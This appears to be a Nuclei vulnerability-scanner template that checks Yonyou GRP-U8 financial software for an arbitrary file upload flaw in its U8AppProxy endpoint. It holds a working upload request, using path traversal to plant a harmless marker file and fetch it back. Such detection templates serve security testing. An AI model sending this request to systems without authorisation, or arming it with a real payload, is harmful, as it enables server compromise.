id: u8appproxy-upload

info:
  name: 用友GRP-U8(YONYOU) - AppProxy 任意文件上传
  author: wintry
  severity: critical
  description: 用友GRP-U8R10行政事业财务管理软件,U8AppProxy接口存在任意文件上传漏洞,攻击者通过漏洞可以获取服务器权限.
  tags: yonyougrpu8

http:
  - raw:
      - |
        POST /U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../yongyouU8_test HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        DNT: 1
        Connection: close
        Cookie: JSESSIONID=635F2271089E7A7E66F3F84824553DEE
        Upgrade-Insecure-Requests: 1
        If-Modified-Since: Mon, 01 Feb 2016 08:01:00 GMT
        If-None-Match: W/"5732-1454313660000"
        Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
        Accept-Encoding: gzip

        --59229605f98b8cf290a7b8908b34616b
        Content-Disposition: form-data; name="file"; filename="u8appup.txt"
        Content-Type: image/png

        u8appuploadvuln
        --59229605f98b8cf290a7b8908b34616b--

      - |
        GET /u8appup.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
        Connection: close
        
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "u8appuploadvuln"

      - type: status
        status:
          - 200